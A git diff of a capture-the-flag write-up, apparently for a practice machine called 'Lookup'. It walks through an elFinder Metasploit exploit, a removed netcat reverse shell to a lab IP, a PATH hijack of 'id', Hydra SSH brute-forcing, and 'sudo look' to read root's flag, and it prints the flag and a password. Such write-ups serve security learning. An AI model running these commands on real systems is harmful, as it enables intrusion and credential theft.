@@ -61,6 +61,10 @@ jose : password123
 
 ## searchsploit `elfinder`
 
+```
+use 4
+```
+
 <img width="1203" height="543" alt="image" src="https://github.com/user-attachments/assets/2daa0ad7-93e0-457d-943e-6602456ca7ac" />
 
 
@@ -69,31 +73,137 @@ jose : password123
 ## we will use metasploit
 
 ```
-set rhosts files.lookup.thm
-set lhost tun0
+set RHOSTS <target_machine_ip>
+set LHOST <your_machine_ip>
+set VHOST files.lookup.thm
 ```
 
 <img width="1098" height="520" alt="image" src="https://github.com/user-attachments/assets/f7e1f747-4f65-43e6-948e-c56c467d5799" />
 
 <img width="987" height="111" alt="image" src="https://github.com/user-attachments/assets/e28c6f21-d552-42be-a749-80ae19366906" />
 
-```
-shell
-busybox nc 10.8.47.102 9999 -e bash
-```
 
-
-<img width="950" height="441" alt="image" src="https://github.com/user-attachments/assets/08ac72d6-939e-4ca9-bb45-a37c9a3140c0" />
 
 ```
 python3 -c 'import pty,os; pty.spawn("/bin/bash")'
 ```
+
+<img width="1315" height="511" alt="image" src="https://github.com/user-attachments/assets/5fe0dabd-864a-4529-9bf6-7f94fbd4a880" />
+
 
 
 ----
 
 
 ## privesc
+
+
+<img width="642" height="80" alt="image" src="https://github.com/user-attachments/assets/6e6f57c2-5778-4b36-988c-e1865836c925" />
+
+
+It's a tool or script (`pwm`) that tries to locate a `.passwords` file in the `/home/www-data/` directory.
+
+When the `id` command is executed without specifying its full path (e.g., `/bin/id`), the system relies on the `PATH` environment variable to locate and run it.
+
+We can manipulate this behavior by creating a custom version of the `id` command. This way, the program executes our version instead, allowing us to produce output that reveals the "think" username.
+
+
+
+
+```
+cat > /tmp/id << 'EOF'
+#!/bin/bash
+echo "uid=1001(think) gid=1001(think) groups=1001(think)"
+EOF
+
+chmod +x /tmp/id
+
+```
+
+```
+export PATH=/tmp:$PATH
+```
+
+```
+/usr/sbin/pwm
+```
+
+
+
+### Let’s put all of that into a file and use hydra again to help crack it
+
+
+```
+hydra -l think -P passwords.txt ssh://10.65.154.155
+```
+
+<img width="1364" height="416" alt="image" src="https://github.com/user-attachments/assets/53b89fa6-8312-4f46-8bc8-44ad1ac4356c" />
+
+
+```
+josemario.AKA(think)
+```
+
+
+```
+su think
+```
+
+
+<img width="938" height="191" alt="image" src="https://github.com/user-attachments/assets/d3e255e8-b4d5-4f94-9ad9-14e2940901c1" />
+
+
+
+<img width="903" height="157" alt="image" src="https://github.com/user-attachments/assets/2ad7d30a-9aff-437a-b787-845a4840af6d" />
+
+
+-----
+
+## get rooot 
+
+
+
+<img width="1101" height="250" alt="image" src="https://github.com/user-attachments/assets/ab65daa4-0e9a-4459-bb49-9ecf141500a3" />
+
+
+## [gtfobins]
+
+
+<img width="1148" height="249" alt="image" src="https://github.com/user-attachments/assets/0e458529-9ba6-4825-b622-99c942421981" />
+
+
+<img width="1241" height="558" alt="image" src="https://github.com/user-attachments/assets/b18e572e-8eca-45de-b534-36b8ebb58290" />
+
+
+```
+sudo look '' /root/root.txt
+```
+
+
+
+<img width="854" height="105" alt="image" src="https://github.com/user-attachments/assets/2f394b4e-9887-4f93-b887-e7c45c967471" />
+
+
+```
+5a285a9f257e45c68bb6c9f9f57d18e8
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
